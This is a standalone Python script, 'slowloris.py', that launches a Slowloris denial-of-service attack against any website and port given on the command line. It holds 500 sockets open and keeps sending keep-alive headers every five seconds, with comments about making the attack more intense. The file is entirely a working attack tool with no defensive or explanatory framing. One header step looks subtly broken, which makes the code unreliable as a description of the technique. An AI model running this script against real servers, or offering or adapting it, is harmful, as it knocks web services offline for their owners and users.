import socket
import threading
import time
import sys

if len(sys.argv) != 3:
    print("Usage: python3 slowloris.py <website> <port>")
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
socket_count = 500  # Increased number of sockets
sockets = []

def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send("GET /?{} HTTP/1.1\r\n".format(time.time()).encode("utf-8"))
        s.send("Host: {}\r\n".format(target).encode("utf-8"))
        s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0\r\n".encode("utf-8"))
        s.send("Accept-Language: en-US,en;q=0.5\r\n".encode("utf-8"))
        s.send("Connection: keep-alive\r\n".encode("utf-8"))
        s.send("\r\n".encode("utf-8"))
        return s
    except socket.gaierror as e:
        print(f"Address-related error connecting to server: {e}")
        return None
    except socket.error as e:
        print(f"Error creating socket: {e}")
        return None

def keep_sockets_alive():
    while True:
        print(f"Sending keep-alive headers... Current socket count: {len(sockets)}")
        for s in list(sockets):
            try:
                s.send("X-a: {}\r\n".format(time.time()).encode("utf-8"))
            except socket.error:
                sockets.remove(s)

        for _ in range(socket_count - len(sockets)):
            s = create_socket()
            if s:
                sockets.append(s)

        time.sleep(5)  # Reduced delay to make the attack more intense

def main():
    print(f"Starting Slowloris attack on {target}:{port} with {socket_count} sockets.")
    for _ in range(socket_count):
        s = create_socket()
        if s:
            sockets.append(s)

    keep_alive_thread = threading.Thread(target=keep_sockets_alive)
    keep_alive_thread.start()

if __name__ == "__main__":
    main()
